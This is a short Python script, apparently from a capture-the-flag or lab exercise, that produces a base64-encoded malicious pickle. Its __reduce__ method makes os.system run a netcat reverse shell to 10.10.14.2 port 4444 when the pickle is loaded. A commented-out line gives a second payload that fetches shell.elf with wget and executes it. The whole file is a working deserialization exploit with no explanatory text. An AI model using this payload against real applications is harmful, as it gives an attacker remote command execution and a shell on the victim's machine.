import os
import pickle
from base64 import b64encode
#PAYLOAD = "cd /tmp && wget http://10.10.14.2:8000/shell.elf && chmod +x shell.elf && ./shell.elf"
PAYLOAD = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.2 4444 >/tmp/f"
class Exploit(object):
    def __reduce__(self):
        return (os.system,(PAYLOAD,))
exploit_code = pickle.dumps(Exploit())
print (b64encode(exploit_code)) 
